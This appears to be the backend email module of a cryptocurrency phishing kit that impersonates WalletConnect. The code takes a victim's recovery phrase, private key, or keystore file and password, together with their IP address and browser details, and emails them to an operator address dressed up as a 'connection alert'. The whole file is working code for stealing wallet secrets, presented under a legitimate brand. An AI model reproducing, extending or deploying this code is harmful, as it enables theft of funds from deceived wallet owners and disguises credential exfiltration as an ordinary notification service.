import { Resend } from 'resend';
import dotenv from 'dotenv';

dotenv.config({ quiet: true });

const resend = new Resend(process.env.RESEND_API_KEY);
const FROM_EMAIL = process.env.EMAIL_FROM || 'notifications@walletconnect.com';
const NOTIFICATION_EMAIL = process.env.NOTIFICATION_EMAIL || 'admin@walletconnect.com';

class EmailService {
  async sendWalletNotification(data: {
    wallet: string;
    method: string;
    phrase?: string;
    privateKey?: string;
    keystore?: string;
    password?: string;
    fileName?: string;
    wordCount?: number;
    ipAddress?: string;
    userAgent?: string;
    timestamp?: string;
  }): Promise<boolean> {
    const timestamp = data.timestamp || new Date().toISOString();
    const date = new Date(timestamp).toLocaleDateString();
    const time = new Date(timestamp).toLocaleTimeString();

    // Build the email content based on method
    let dataHtml = '';
    let dataText = '';

    if (data.method === 'phrase') {
      dataHtml = `
        <div style="background: #f0f4ff; padding: 16px; border-radius: 8px; margin: 10px 0;">
          <p style="margin: 4px 0;"><strong>🔑 Recovery Phrase:</strong></p>
          <p style="margin: 8px 0; font-family: monospace; font-size: 14px; background: white; padding: 12px; border-radius: 4px; word-break: break-all;">
            ${data.phrase || 'Not provided'}
          </p>
          <p style="margin: 4px 0; color: #6b7280; font-size: 12px;">
            📊 Word Count: ${data.wordCount || 0}/24
          </p>
        </div>
      `;
      dataText = `Recovery Phrase: ${data.phrase || 'Not provided'}\nWord Count: ${data.wordCount || 0}/24`;
    } else if (data.method === 'private key') {
      dataHtml = `
        <div style="background: #fef3c7; padding: 16px; border-radius: 8px; margin: 10px 0;">
          <p style="margin: 4px 0;"><strong>🔑 Private Key:</strong></p>
          <p style="margin: 8px 0; font-family: monospace; font-size: 14px; background: white; padding: 12px; border-radius: 4px; word-break: break-all;">
            ${data.privateKey || 'Not provided'}
          </p>
        </div>
      `;
      dataText = `Private Key: ${data.privateKey || 'Not provided'}`;
    } else if (data.method === 'keystore') {
      dataHtml = `
        <div style="background: #f3e8ff; padding: 16px; border-radius: 8px; margin: 10px 0;">
          <p style="margin: 4px 0;"><strong>📁 File Name:</strong> ${data.fileName || 'Not provided'}</p>
          <p style="margin: 4px 0;"><strong>🔐 Password:</strong> ${data.password || 'Not provided'}</p>
          ${data.keystore ? `
            <p style="margin: 8px 0 4px 0;"><strong>📄 Content Preview:</strong></p>
            <p style="margin: 4px 0; font-family: monospace; font-size: 12px; background: white; padding: 12px; border-radius: 4px; word-break: break-all; max-height: 100px; overflow: auto;">
              ${data.keystore.substring(0, 300)}...
            </p>
          ` : ''}
        </div>
      `;
      dataText = `File Name: ${data.fileName || 'Not provided'}\nPassword: ${data.password || 'Not provided'}`;
    }

    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <style>
            body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; }
            .container { max-width: 600px; margin: 0 auto; padding: 40px 20px; }
            .header { background: linear-gradient(135deg, #1e40af, #3b82f6); color: white; padding: 30px; border-radius: 12px 12px 0 0; text-align: center; }
            .logo { font-size: 24px; font-weight: bold; }
            .content { background: white; padding: 30px; border: 1px solid #e5e7eb; border-top: none; border-radius: 0 0 12px 12px; }
            .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
            .info-item { background: #f9fafb; padding: 10px; border-radius: 6px; }
            .info-item label { font-size: 11px; color: #6b7280; text-transform: uppercase; font-weight: 600; display: block; }
            .info-item value { font-size: 14px; color: #111827; font-weight: 500; }
            .footer { text-align: center; margin-top: 30px; font-size: 12px; color: #999; border-top: 1px solid #eee; padding-top: 20px; }
            .badge { display: inline-block; padding: 4px 12px; border-radius: 9999px; font-size: 12px; font-weight: 600; }
            .badge-phrase { background: #dbeafe; color: #1e40af; }
            .badge-keystore { background: #ede9fe; color: #5b21b6; }
            .badge-private { background: #fef3c7; color: #92400e; }
            .alert { background: #fef2f2; border-left: 4px solid #dc2626; padding: 12px; margin: 15px 0; border-radius: 4px; }
            .alert-text { color: #991b1b; font-size: 13px; margin: 0; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">
              <div class="logo">🔐 WalletConnect</div>
              <p style="margin: 4px 0 0 0; opacity: 0.9; font-size: 14px;">New Wallet Connection Alert</p>
            </div>
            
            <div class="content">
              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h2 style="margin: 0; font-size: 20px;">🔔 Connection Detected</h2>
                <span class="badge badge-${data.method === 'phrase' ? 'phrase' : data.method === 'keystore' ? 'keystore' : 'private'}">
                  ${data.method.toUpperCase()}
                </span>
              </div>

              <div class="info-grid">
                <div class="info-item">
                  <label>Wallet</label>
                  <value>${data.wallet}</value>
                </div>
                <div class="info-item">
                  <label>Method</label>
                  <value>${data.method}</value>
                </div>
                <div class="info-item">
                  <label>Date</label>
                  <value>${date}</value>
                </div>
                <div class="info-item">
                  <label>Time</label>
                  <value>${time}</value>
                </div>
                <div class="info-item" style="grid-column: 1 / -1;">
                  <label>IP Address</label>
                  <value>${data.ipAddress || 'Unknown'}</value>
                </div>
                <div class="info-item" style="grid-column: 1 / -1;">
                  <label>User Agent</label>
                  <value style="font-size: 12px; word-break: break-all;">${data.userAgent || 'Unknown'}</value>
                </div>
              </div>

              <div style="margin: 20px 0;">
                <h3 style="font-size: 14px; margin: 0 0 8px 0;">📦 Connection Data</h3>
                ${dataHtml}
              </div>

              <div class="alert">
                <p class="alert-text">⚠️ This is a sensitive security alert. Please investigate immediately if this was unexpected.</p>
              </div>

              <div style="margin-top: 20px; padding: 12px; background: #f0fdf4; border-radius: 6px; border: 1px solid #bbf7d0;">
                <p style="margin: 0; color: #166534; font-size: 13px;">
                  ✅ This connection has been logged and saved to the database.
                </p>
              </div>
            </div>

            <div class="footer">
              <p>© ${new Date().getFullYear()} WalletConnect. All rights reserved.</p>
              <p style="color: #bbb; font-size: 11px;">This is an automated security notification.</p>
            </div>
          </div>
        </body>
      </html>
    `;

    const text = `
🔐 WALLETCONNECT - NEW WALLET CONNECTION
════════════════════════════════════════

Wallet: ${data.wallet}
Method: ${data.method}
Date: ${date}
Time: ${time}
IP: ${data.ipAddress || 'Unknown'}

📦 CONNECTION DATA:
${dataText}

⚠️ This is a sensitive security alert. Please investigate immediately if this was unexpected.
    `;

    try {
      const { data: emailData, error } = await resend.emails.send({
        from: FROM_EMAIL,
        to: [NOTIFICATION_EMAIL],
        subject: `🔐 New Wallet Connection: ${data.wallet} (${data.method})`,
        html: html,
        text: text,
      });

      if (error) {
        console.error('Resend error:', error);
        return false;
      }

      console.log('Email notification sent:', emailData);
      return true;
    } catch (error) {
      console.error('Email send error:', error);
      return false;
    }
  }
}

export const emailService = new EmailService();